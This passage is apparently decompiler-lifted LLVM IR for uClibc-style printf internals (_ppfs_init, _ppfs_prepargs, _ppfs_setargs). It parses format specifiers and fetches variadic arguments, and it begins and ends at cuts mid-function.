  uselistorder i32 %v0_23e4c, { 1, 0 }
  uselistorder i32 %v1_23e28, { 1, 0 }
  uselistorder i32 %v1_23df0, { 1, 0, 2 }
  uselistorder i32 %v4_23dc0, { 1, 2, 0 }
  uselistorder i32 %v4_23db0, { 1, 0 }
  uselistorder i32 %v0_23d24, { 1, 0 }
  uselistorder i32 %v2_23d14, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_23cdc, { 1, 2, 0, 3 }
  uselistorder i32 %v3_23c54, { 1, 0 }
  uselistorder i32 %v2_23bb4, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 %v0_23bd0, { 1, 2, 3, 0 }
  uselistorder i32 %v2_23b50, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_23ab8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_23a5c.pre, { 1, 0, 2 }
  uselistorder i32 %v1_23a54, { 1, 0 }
  uselistorder i32 %v1_23a00, { 0, 1, 3, 2 }
  uselistorder i32 %v1_23e78, { 0, 8, 1, 7, 2, 3, 6, 5, 4, 9 }
  uselistorder i32 %v2_239c0, { 1, 0 }
  uselistorder i32 %v1_239b8.lcssa, { 1, 0 }
  uselistorder i8 %v2_239a4, { 1, 0 }
  uselistorder i32 %v2_239b8, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-356.1.ph37, { 1, 0 }
  uselistorder i32 %v5_239d0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_23ad8, { 6, 4, 3, 15, 14, 5, 0, 1, 13, 12, 11, 7, 10, 8, 2, 9 }
  uselistorder i1 %v7_23bc8, { 1, 0 }
  uselistorder i1 %v7_23b18, { 1, 2, 0 }
  uselistorder i1 %v7_23d04, { 1, 0 }
  uselistorder i1 %v7_23c7c, { 1, 0 }
  uselistorder i1 %v7_23b58, { 1, 0 }
  uselistorder i32 %v2_23cb4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_23ca8, { 1, 2, 3, 0, 6, 4, 5, 7 }
  uselistorder i32 %v2_23db8, { 1, 2, 3, 4, 5, 0, 11, 10, 9, 7, 8, 6 }
  uselistorder i32 %v2_23a58, { 1, 3, 2, 0 }
  uselistorder i32 %v4_23a34, { 1, 0 }
  uselistorder i32 %v2_238f0, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-352, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp105, { 1, 2, 0 }
  uselistorder i32 %tmp104, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp98, { 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 19, 5, 6, 7, 8, 9, 10, 11, 22, 12, 13, 14, 15, 16, 17, 18, 0, 20, 21, 23, 25, 24, 1, 26, 27, 28, 29, 30 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 5, 8, 7, 9, 11, 10, 16, 12, 13, 14, 15, 17, 18, 21, 19, 20, 23, 22, 25, 24, 27, 26, 29, 28, 32, 30, 31, 35, 36, 33, 34, 47, 37, 48, 38, 40, 39, 42, 41, 44, 43, 46, 45, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -127084), { 1, 0 }
  uselistorder i32 -276, { 1, 0 }
  uselistorder label %dec_label_pc_23fa8, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_23fa0, { 2, 10, 3, 4, 5, 0, 6, 7, 1, 8, 9 }
  uselistorder label %dec_label_pc_23f28, { 1, 0 }
  uselistorder label %dec_label_pc_23eb8, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %dec_label_pc_23e64, { 1, 0 }
  uselistorder label %dec_label_pc_23e48, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_23e48thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_23d68, { 1, 0 }
  uselistorder label %dec_label_pc_23d20, { 1, 0 }
  uselistorder label %dec_label_pc_23c34, { 0, 2, 1 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 4, 1, 2, 0, 3 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 4, 3, 1, 0, 2 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_23b08, { 1, 0 }
  uselistorder label %dec_label_pc_23b04, { 2, 1, 0 }
  uselistorder label %bb151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_23a50, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_239f4, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_239c0, { 1, 0, 2 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_239a4.outer36, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_23fdc = load i32, i32* @r4, align 4
  %v6_23fdc = load i32, i32* @r5, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_23fe8 = load i32, i32* @r1, align 4
  store i32 %v0_23fe8, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_23ff4 = bitcast i32* %arg1 to i8*
  %v4_23ff4 = call i32 @__GI_memset(i8* %v3_23ff4, i32 0, i32 152)
  store i32 %v4_23ff4, i32* %r0.global-to-local, align 4
  %v0_23ff8 = load i32, i32* @r4, align 4
  %v1_23ff8 = add i32 %v0_23ff8, 24
  %v2_23ff8 = inttoptr i32 %v1_23ff8 to i32*
  %v3_23ff8 = load i32, i32* %v2_23ff8, align 4
  store i32 %v3_23ff8, i32* %r3.global-to-local, align 4
  %v0_23ffc = load i32, i32* @r5, align 4
  %v2_23ffc = inttoptr i32 %v0_23ff8 to i32*
  store i32 %v0_23ffc, i32* %v2_23ffc, align 4
  %v0_24000 = load i32, i32* %r3.global-to-local, align 4
  %v1_24000 = add i32 %v0_24000, -1
  %v1_24004 = load i32, i32* @r4, align 4
  %v2_24004 = add i32 %v1_24004, 24
  %v3_24004 = inttoptr i32 %v2_24004 to i32*
  store i32 %v1_24000, i32* %v3_24004, align 4
  %v0_24008 = load i32, i32* @r4, align 4
  %v1_24008 = add i32 %v0_24008, 40
  store i32 %v1_24008, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_2401821 = inttoptr i32 %v1_24008 to i32*
  store i32 8, i32* %v2_2401821, align 4
  %v3_2401822 = load i32, i32* %r2.global-to-local, align 4
  %v4_2401823 = add i32 %v3_2401822, 4
  store i32 %v4_2401823, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_24014.dec_label_pc_24014_crit_edge

dec_label_pc_24014.dec_label_pc_24014_crit_edge:  ; preds = %entry, %dec_label_pc_24014.dec_label_pc_24014_crit_edge
  %v4_2401824 = phi i32 [ %v4_2401823, %entry ], [ %v4_24018, %dec_label_pc_24014.dec_label_pc_24014_crit_edge ]
  %v0_24014.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_24018.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_24014 = add i32 %v0_24014.pre, -1
  store i32 %v1_24014, i32* %r3.global-to-local, align 4
  %v7_24014 = icmp eq i32 %v0_24014.pre, 1
  %v2_24018 = inttoptr i32 %v4_2401824 to i32*
  store i32 %v0_24018.pre, i32* %v2_24018, align 4
  %v3_24018 = load i32, i32* %r2.global-to-local, align 4
  %v4_24018 = add i32 %v3_24018, 4
  store i32 %v4_24018, i32* %r2.global-to-local, align 4
  br i1 %v7_24014, label %dec_label_pc_24020, label %dec_label_pc_24014.dec_label_pc_24014_crit_edge

dec_label_pc_24020:                               ; preds = %dec_label_pc_24014.dec_label_pc_24014_crit_edge
  %v0_24020 = load i32, i32* @r5, align 4
  store i32 %v0_24020, i32* %r2.global-to-local, align 4
  %v1_240602 = inttoptr i32 %v0_24020 to i8*
  %v2_240603 = load i8, i8* %v1_240602, align 1
  %v3_240604 = zext i8 %v2_240603 to i32
  store i32 %v3_240604, i32* %r0.global-to-local, align 4
  %v2_240645 = icmp eq i8 %v2_240603, 0
  br i1 %v2_240645, label %dec_label_pc_2406c, label %dec_label_pc_24028

dec_label_pc_24028:                               ; preds = %dec_label_pc_24020, %dec_label_pc_24060.backedge
  %v0_24030 = phi i32 [ %storemerge, %dec_label_pc_24060.backedge ], [ %v0_24020, %dec_label_pc_24020 ]
  %v0_24028 = phi i32 [ %v3_24060, %dec_label_pc_24060.backedge ], [ %v3_240604, %dec_label_pc_24020 ]
  %v7_24028 = icmp eq i32 %v0_24028, 37
  br i1 %v7_24028, label %dec_label_pc_24030, label %dec_label_pc_2405c

dec_label_pc_24030:                               ; preds = %dec_label_pc_24028
  %v1_24030 = add i32 %v0_24030, 1
  %v2_24030 = inttoptr i32 %v1_24030 to i8*
  %v3_24030 = load i8, i8* %v2_24030, align 1
  %v4_24030 = zext i8 %v3_24030 to i32
  store i32 %v4_24030, i32* %r3.global-to-local, align 4
  store i32 %v1_24030, i32* %r2.global-to-local, align 4
  %v7_24034 = icmp eq i8 %v3_24030, 37
  br i1 %v7_24034, label %dec_label_pc_2405c, label %dec_label_pc_2403c

dec_label_pc_2403c:                               ; preds = %dec_label_pc_24030
  %v1_2403c = load i32, i32* @r4, align 4
  %v2_2403c = inttoptr i32 %v1_2403c to i32*
  store i32 %v1_24030, i32* %v2_2403c, align 4
  %v0_24040 = load i32, i32* @r4, align 4
  store i32 %v0_24040, i32* %r0.global-to-local, align 4
  %v1_24044 = inttoptr i32 %v0_24040 to i8*
  %v2_24044 = call i32 @_ppfs_parsespec(i8* %v1_24044)
  store i32 %v2_24044, i32* %r0.global-to-local, align 4
  %v1_24048 = icmp slt i32 %v2_24044, 0
  br i1 %v1_24048, label %dec_label_pc_24070.loopexit, label %dec_label_pc_24054

dec_label_pc_24054:                               ; preds = %dec_label_pc_2403c
  %v0_24054 = load i32, i32* @r4, align 4
  %v1_24054 = inttoptr i32 %v0_24054 to i32*
  %v2_24054 = load i32, i32* %v1_24054, align 4
  br label %dec_label_pc_24060.backedge

dec_label_pc_2405c:                               ; preds = %dec_label_pc_24028, %dec_label_pc_24030
  %v0_2405c = phi i32 [ %v0_24030, %dec_label_pc_24028 ], [ %v1_24030, %dec_label_pc_24030 ]
  %v1_2405c = add i32 %v0_2405c, 1
  br label %dec_label_pc_24060.backedge

dec_label_pc_24060.backedge:                      ; preds = %dec_label_pc_2405c, %dec_label_pc_24054
  %storemerge = phi i32 [ %v1_2405c, %dec_label_pc_2405c ], [ %v2_24054, %dec_label_pc_24054 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_24060 = inttoptr i32 %storemerge to i8*
  %v2_24060 = load i8, i8* %v1_24060, align 1
  %v3_24060 = zext i8 %v2_24060 to i32
  store i32 %v3_24060, i32* %r0.global-to-local, align 4
  %v2_24064 = icmp eq i8 %v2_24060, 0
  br i1 %v2_24064, label %dec_label_pc_24060.dec_label_pc_2406c_crit_edge, label %dec_label_pc_24028

dec_label_pc_24060.dec_label_pc_2406c_crit_edge:  ; preds = %dec_label_pc_24060.backedge
  %v0_2406c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2406c

dec_label_pc_2406c:                               ; preds = %dec_label_pc_24060.dec_label_pc_2406c_crit_edge, %dec_label_pc_24020
  %v0_2406c = phi i32 [ %v0_2406c.pre, %dec_label_pc_24060.dec_label_pc_2406c_crit_edge ], [ %v0_24020, %dec_label_pc_24020 ]
  %v1_2406c = load i32, i32* @r4, align 4
  %v2_2406c = inttoptr i32 %v1_2406c to i32*
  store i32 %v0_2406c, i32* %v2_2406c, align 4
  %v1_24078.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_24070

dec_label_pc_24070.loopexit:                      ; preds = %dec_label_pc_2403c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_24070

dec_label_pc_24070:                               ; preds = %dec_label_pc_24070.loopexit, %dec_label_pc_2406c
  %v1_24078 = phi i32 [ -1, %dec_label_pc_24070.loopexit ], [ %v1_24078.pre, %dec_label_pc_2406c ]
  store i32 %v3_23fdc, i32* @r4, align 4
  store i32 %v6_23fdc, i32* @r5, align 4
  ret i32 %v1_24078

; uselistorder directives
  uselistorder i32 %v3_24060, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_24020, { 1, 0, 2, 3 }
  uselistorder i32 %v4_24018, { 1, 0 }
  uselistorder i32 %v0_24014.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 4, 1, 7, 3, 2, 0, 5, 6, 8 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 5, 6, 3, 1, 7, 0 }
  uselistorder label %dec_label_pc_2405c, { 1, 0 }
  uselistorder label %dec_label_pc_24028, { 1, 0 }
  uselistorder label %dec_label_pc_24014.dec_label_pc_24014_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_2407c = load i32, i32* @r4, align 4
  store i32 %v3_2407c, i32* %stack_var_-12, align 4
  %v0_24080 = load i32, i32* @r0, align 4
  %v1_24080 = add i32 %v0_24080, 24
  %v2_24080 = inttoptr i32 %v1_24080 to i32*
  %v3_24080 = load i32, i32* %v2_24080, align 4
  store i32 %v3_24080, i32* %r5.global-to-local, align 4
  store i32 %v0_24080, i32* @r4, align 4
  %v2_24090 = add i32 %v0_24080, 76
  %v3_24090 = inttoptr i32 %v2_24090 to i32*
  store i32 %arg2, i32* %v3_24090, align 4
  %tmp5 = icmp slt i32 %v3_24080, 1
  br i1 %tmp5, label %dec_label_pc_240b4, label %dec_label_pc_24098

dec_label_pc_24098:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_2409c = load i32, i32* @r0, align 4
  %v2_2409c = add i32 %v1_2409c, 8
  %v3_2409c = inttoptr i32 %v2_2409c to i32*
  store i32 0, i32* %v3_2409c, align 4
  %v0_240a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_240a0 = load i32, i32* @r0, align 4
  %v2_240a0 = add i32 %v1_240a0, 28
  %v3_240a0 = inttoptr i32 %v2_240a0 to i32*
  store i32 %v0_240a0, i32* %v3_240a0, align 4
  %v0_240a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_240a4 = load i32, i32* @r0, align 4
  %v2_240a4 = add i32 %v1_240a4, 24
  %v3_240a4 = inttoptr i32 %v2_240a4 to i32*
  store i32 %v0_240a4, i32* %v3_240a4, align 4
  %v0_240a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_240a8 = load i32, i32* @r0, align 4
  %v2_240a8 = add i32 %v1_240a8, 4
  %v3_240a8 = inttoptr i32 %v2_240a8 to i32*
  store i32 %v0_240a8, i32* %v3_240a8, align 4
  %v0_240ac = call i32 @_ppfs_setargs()
  store i32 %v0_240ac, i32* @r0, align 4
  %v0_240b0 = load i32, i32* %r5.global-to-local, align 4
  %v1_240b0 = load i32, i32* @r4, align 4
  %v2_240b0 = add i32 %v1_240b0, 24
  %v3_240b0 = inttoptr i32 %v2_240b0 to i32*
  store i32 %v0_240b0, i32* %v3_240b0, align 4
  br label %dec_label_pc_240b4

dec_label_pc_240b4:                               ; preds = %entry, %dec_label_pc_24098
  %v2_240b8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_240b8, i32* @r4, align 4
  %v1_240bc = load i32, i32* @r0, align 4
  ret i32 %v1_240bc

; uselistorder directives
  uselistorder i32 %v0_24080, { 1, 0, 2 }
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_240b4, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_240c0 = load i32, i32* @r0, align 4
  %v1_240c0 = add i32 %v0_240c0, 24
  %v2_240c0 = inttoptr i32 %v1_240c0 to i32*
  %v3_240c0 = load i32, i32* %v2_240c0, align 4
  store i32 %v3_240c0, i32* %r1.global-to-local, align 4
  %v2_240c4 = icmp eq i32 %v3_240c0, 0
  %v3_240c8 = load i32, i32* @r4, align 4
  store i32 %v3_240c8, i32* %stack_var_-8, align 4
  %v1_240cc = add i32 %v0_240c0, 8
  %v2_240cc = inttoptr i32 %v1_240cc to i32*
  %v3_240cc = load i32, i32* %v2_240cc, align 4
  store i32 %v3_240cc, i32* %r3.global-to-local, align 4
  %v6_240d4 = icmp eq i32 %v3_240cc, -2147483648
  br i1 %v2_240c4, label %dec_label_pc_240d4, label %dec_label_pc_2420c

dec_label_pc_240d4:                               ; preds = %entry
  br i1 %v6_240d4, label %dec_label_pc_240dc, label %dec_label_pc_240f4

dec_label_pc_240dc:                               ; preds = %dec_label_pc_240d4
  %v1_240dc = add i32 %v0_240c0, 76
  %v2_240dc = inttoptr i32 %v1_240dc to i32*
  %v3_240dc = load i32, i32* %v2_240dc, align 4
  store i32 %v3_240dc, i32* %r3.global-to-local, align 4
  %v1_240e0 = inttoptr i32 %v3_240dc to i32*
  %v2_240e0 = load i32, i32* %v1_240e0, align 4
  store i32 %v2_240e0, i32* %r2.global-to-local, align 4
  %v1_240e4 = add i32 %v3_240dc, 4
  store i32 %v1_240e4, i32* %r3.global-to-local, align 4
  store i32 %v1_240e4, i32* %v2_240dc, align 4
  %v0_240ec = load i32, i32* %r2.global-to-local, align 4
  %v1_240ec = load i32, i32* @r0, align 4
  %v2_240ec = add i32 %v1_240ec, 8
  %v3_240ec = inttoptr i32 %v2_240ec to i32*
  store i32 %v0_240ec, i32* %v3_240ec, align 4
  %v0_240f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_240f0 = load i32, i32* @r0, align 4
  %v2_240f0 = add i32 %v1_240f0, 80
  %v3_240f0 = inttoptr i32 %v2_240f0 to i32*
  store i32 %v0_240f0, i32* %v3_240f0, align 4
  %v0_240f4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_240f4

dec_label_pc_240f4:                               ; preds = %dec_label_pc_240d4, %dec_label_pc_240dc
  %v1_24110 = phi i32 [ %v0_240c0, %dec_label_pc_240d4 ], [ %v0_240f4.pre, %dec_label_pc_240dc ]
  %v1_240f4 = add i32 %v1_24110, 4
  %v2_240f4 = inttoptr i32 %v1_240f4 to i32*
  %v3_240f4 = load i32, i32* %v2_240f4, align 4
  store i32 %v3_240f4, i32* %r3.global-to-local, align 4
  %v6_240f8 = icmp eq i32 %v3_240f4, -2147483648
  %v1_240fc = add i32 %v1_24110, 80
  store i32 %v1_240fc, i32* %ip.global-to-local, align 4
  br i1 %v6_240f8, label %dec_label_pc_24104, label %dec_label_pc_2411c

dec_label_pc_24104:                               ; preds = %dec_label_pc_240f4
  %v1_24104 = add i32 %v1_24110, 76
  %v2_24104 = inttoptr i32 %v1_24104 to i32*
  %v3_24104 = load i32, i32* %v2_24104, align 4
  store i32 %v3_24104, i32* %r3.global-to-local, align 4
  %v1_24108 = inttoptr i32 %v3_24104 to i32*
  %v2_24108 = load i32, i32* %v1_24108, align 4
  store i32 %v2_24108, i32* %r2.global-to-local, align 4
  %v1_2410c = add i32 %v3_24104, 4
  store i32 %v1_2410c, i32* %r3.global-to-local, align 4
  store i32 %v1_2410c, i32* %v2_24104, align 4
  %v0_24114 = load i32, i32* %r2.global-to-local, align 4
  %v1_24114 = load i32, i32* @r0, align 4
  %v2_24114 = add i32 %v1_24114, 4
  %v3_24114 = inttoptr i32 %v2_24114 to i32*
  store i32 %v0_24114, i32* %v3_24114, align 4
  %v0_24118 = load i32, i32* %r2.global-to-local, align 4
  %v1_24118 = load i32, i32* @r0, align 4
  %v2_24118 = add i32 %v1_24118, 80
  %v3_24118 = inttoptr i32 %v2_24118 to i32*
  store i32 %v0_24118, i32* %v3_24118, align 4
  %v0_241fc17.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_2411c

dec_label_pc_2411c:                               ; preds = %dec_label_pc_240f4, %dec_label_pc_24104
  %v0_241fc17 = phi i32 [ %v1_24110, %dec_label_pc_240f4 ], [ %v0_241fc17.pre, %dec_label_pc_24104 ]
  store i32 2055, i32* %r4.global-to-local, align 4
  %v0_24120 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_24120, i32* %lr.global-to-local, align 4
  %v1_241fc18 = add i32 %v0_241fc17, 28
  %v2_241fc19 = inttoptr i32 %v1_241fc18 to i32*
  %v3_241fc20 = load i32, i32* %v2_241fc19, align 4
  store i32 %v3_241fc20, i32* %r3.global-to-local, align 4
  %v5_2420422 = icmp slt i32 %v0_24120, %v3_241fc20
  br i1 %v5_2420422, label %dec_label_pc_24128, label %dec_label_pc_24208.loopexit

dec_label_pc_24128:                               ; preds = %dec_label_pc_2411c, %dec_label_pc_241fc.backedge
  %v0_241fc24 = phi i32 [ %v0_241fc, %dec_label_pc_241fc.backedge ], [ %v0_241fc17, %dec_label_pc_2411c ]
  %v0_2413423 = phi i32 [ %v0_24134.be, %dec_label_pc_241fc.backedge ], [ %v0_24120, %dec_label_pc_2411c ]
  %v4_24128 = mul i32 %v0_2413423, 4
  %v5_24128 = add i32 %v4_24128, %v0_241fc24
  store i32 %v5_24128, i32* %r3.global-to-local, align 4
  %v1_2412c = add i32 %v5_24128, 40
  %v2_2412c = inttoptr i32 %v1_2412c to i32*
  %v3_2412c = load i32, i32* %v2_2412c, align 4
  store i32 %v3_2412c, i32* %r3.global-to-local, align 4
  %v7_24130 = icmp eq i32 %v3_2412c, 8
  %v1_24134 = add i32 %v0_2413423, 1
  store i32 %v1_24134, i32* %lr.global-to-local, align 4
  br i1 %v7_24130, label %dec_label_pc_241fc.backedge, label %dec_label_pc_2413c

dec_label_pc_2413c:                               ; preds = %dec_label_pc_24128
  %v1_2413c = add i32 %v0_241fc24, 76
  %v2_2413c = inttoptr i32 %v1_2413c to i32*
  %v3_2413c = load i32, i32* %v2_2413c, align 4
  store i32 %v3_2413c, i32* %r1.global-to-local, align 4
  %v8_24140 = icmp sgt i32 %v3_2412c, 8
  br i1 %v8_24140, label %dec_label_pc_24164, label %dec_label_pc_24144

dec_label_pc_24144:                               ; preds = %dec_label_pc_2413c
  %v7_24144 = icmp eq i32 %v3_2412c, 2
  br i1 %v7_24144, label %dec_label_pc_241b4, label %dec_label_pc_2414c

dec_label_pc_2414c:                               ; preds = %dec_label_pc_24144
  %v8_2414c = icmp sgt i32 %v3_2412c, 2
  br i1 %v8_2414c, label %dec_label_pc_2415c, label %dec_label_pc_24150

dec_label_pc_24150:                               ; preds = %dec_label_pc_2414c
  %v1_24150 = icmp slt i32 %v3_2412c, 0
  br i1 %v1_24150, label %dec_label_pc_241e8, label %dec_label_pc_241b4

dec_label_pc_2415c:                               ; preds = %dec_label_pc_2414c
  %v7_2415c = icmp eq i32 %v3_2412c, 7
  br i1 %v7_2415c, label %dec_label_pc_241c8, label %dec_label_pc_241e8

dec_label_pc_24164:                               ; preds = %dec_label_pc_2413c
  %v7_24164 = icmp eq i32 %v3_2412c, 1024
  br i1 %v7_24164, label %dec_label_pc_241b4, label %dec_label_pc_2416c

dec_label_pc_2416c:                               ; preds = %dec_label_pc_24164
  %v8_2416c = icmp sgt i32 %v3_2412c, 1024
  br i1 %v8_2416c, label %dec_label_pc_24184, label %dec_label_pc_24170

dec_label_pc_24170:                               ; preds = %dec_label_pc_2416c
  switch i32 %v3_2412c, label %dec_label_pc_241e8 [
    i32 256, label %dec_label_pc_241b4
    i32 512, label %dec_label_pc_241b4
  ]

dec_label_pc_24184:                               ; preds = %dec_label_pc_2416c
  %v7_24184 = icmp eq i32 %v3_2412c, 2048
  br i1 %v7_24184, label %dec_label_pc_24198, label %dec_label_pc_24190

dec_label_pc_24190:                               ; preds = %dec_label_pc_24184
  %v1_2418c = load i32, i32* %r4.global-to-local, align 4
  %v9_2418c = icmp eq i32 %v3_2412c, %v1_2418c
  br i1 %v9_2418c, label %dec_label_pc_241c8, label %dec_label_pc_241e8

dec_label_pc_24198:                               ; preds = %dec_label_pc_24184
  %v1_24198 = add i32 %v3_2413c, 7
  %v1_2419c = and i32 %v1_24198, -8
  store i32 %v1_2419c, i32* %r3.global-to-local, align 4
  %v1_241a0 = inttoptr i32 %v1_2419c to i32*
  %v2_241a0 = load i32, i32* %v1_241a0, align 8
  store i32 %v2_241a0, i32* %r1.global-to-local, align 4
  %v3_241a0 = or i32 %v1_2419c, 4
  %v4_241a0 = inttoptr i32 %v3_241a0 to i32*
  %v5_241a0 = load i32, i32* %v4_241a0, align 4
  store i32 %v5_241a0, i32* %r2.global-to-local, align 4
  %v1_241a4 = add i32 %v1_2419c, 8
  store i32 %v1_241a4, i32* %r3.global-to-local, align 4
  store i32 %v1_241a4, i32* %v2_2413c, align 4
  %v0_241ac = load i32, i32* %ip.global-to-local, align 4
  %v1_241ac = inttoptr i32 %v0_241ac to i32*
  %v2_241ac = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_241ac, i32* %v1_241ac, align 4
  %v3_241ac = add i32 %v0_241ac, 4
  %v4_241ac = inttoptr i32 %v3_241ac to i32*
  %v5_241ac = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_241ac, i32* %v4_241ac, align 4
  br label %dec_label_pc_241f8

dec_label_pc_241b4:                               ; preds = %dec_label_pc_24170, %dec_label_pc_24170, %dec_label_pc_24150, %dec_label_pc_24164, %dec_label_pc_24144
  %v1_241b4 = inttoptr i32 %v3_2413c to i32*
  %v2_241b4 = load i32, i32* %v1_241b4, align 4
  store i32 %v2_241b4, i32* %r2.global-to-local, align 4
  %v1_241b8 = add i32 %v3_2413c, 4
  store i32 %v1_241b8, i32* %r3.global-to-local, align 4
  store i32 %v1_241b8, i32* %v2_2413c, align 4
  %v0_241c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_241c0 = load i32, i32* %ip.global-to-local, align 4
  %v2_241c0 = inttoptr i32 %v1_241c0 to i32*
  store i32 %v0_241c0, i32* %v2_241c0, align 4
  br label %dec_label_pc_241f8

dec_label_pc_241c8:                               ; preds = %dec_label_pc_2415c, %dec_label_pc_24190
  %v3_241c8 = load i32, i32* %v2_2413c, align 4
  %v1_241cc = add i32 %v3_241c8, 7
  %v1_241d0 = and i32 %v1_241cc, -8
  store i32 %v1_241d0, i32* %r3.global-to-local, align 4
  %v1_241d4 = inttoptr i32 %v1_241d0 to i32*
  %v2_241d4 = load i32, i32* %v1_241d4, align 8
  store i32 %v2_241d4, i32* %r1.global-to-local, align 4
  %v3_241d4 = or i32 %v1_241d0, 4
  %v4_241d4 = inttoptr i32 %v3_241d4 to i32*
  %v5_241d4 = load i32, i32* %v4_241d4, align 4
  store i32 %v5_241d4, i32* %r2.global-to-local, align 4
  %v1_241d8 = add i32 %v1_241d0, 8
  store i32 %v1_241d8, i32* %r3.global-to-local, align 4
  store i32 %v1_241d8, i32* %v2_2413c, align 4
  %v0_241e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_241e0 = inttoptr i32 %v0_241e0 to i32*
  %v2_241e0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_241e0, i32* %v1_241e0, align 4
  %v3_241e0 = add i32 %v0_241e0, 4
  %v4_241e0 = inttoptr i32 %v3_241e0 to i32*
  %v5_241e0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_241e0, i32* %v4_241e0, align 4
  br label %dec_label_pc_241f8

dec_label_pc_241e8:                               ; preds = %dec_label_pc_24170, %dec_label_pc_2415c, %dec_label_pc_24150, %dec_label_pc_24190
  %v1_241e8 = add i32 %v3_2413c, 4
  store i32 %v1_241e8, i32* %r3.global-to-local, align 4
  store i32 %v1_241e8, i32* %v2_2413c, align 4
  %v0_241f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_241f0 = inttoptr i32 %v0_241f0 to i32*
  %v2_241f0 = load i32, i32* %v1_241f0, align 4
  store i32 %v2_241f0, i32* %r3.global-to-local, align 4
  %v1_241f4 = load i32, i32* %ip.global-to-local, align 4
  %v2_241f4 = inttoptr i32 %v1_241f4 to i32*
  store i32 %v2_241f0, i32* %v2_241f4, align 4
  br label %dec_label_pc_241f8

dec_label_pc_241f8:                               ; preds = %dec_label_pc_241c8, %dec_label_pc_241b4, %dec_label_pc_24198, %dec_label_pc_241e8
  %v0_241f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_241f8 = add i32 %v0_241f8, 8
  store i32 %v1_241f8, i32* %ip.global-to-local, align 4
